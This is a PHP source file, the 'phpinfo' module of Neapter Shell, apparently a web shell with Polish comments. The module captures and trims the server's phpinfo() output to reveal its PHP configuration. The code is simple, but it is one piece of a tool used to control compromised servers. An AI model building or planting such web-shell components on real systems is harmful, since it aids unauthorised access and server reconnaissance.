<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Wyswietlanie PHPinfo
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModulePhpinfo extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('phpinfo');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2011-11-20 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Informacje o PHP

	Użycie:
		phpinfo
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        ob_start();
        phpinfo();
        $sData = ob_get_contents();
        ob_clean();
        ob_end_flush();

        if (PHP_SAPI !== 'cli') {
            $sData = str_replace(
                array(
                    ' class="e"',
                    ' class="v"'
                ),
                '',
                substr(
                    $sData,
                    strpos($sData, '<div class="center">') + 20,
                    -(strlen($sData) - strrpos($sData, '<h2>PHP License</h2>'))
                )
            );
        }

        return $sData;
    }
}
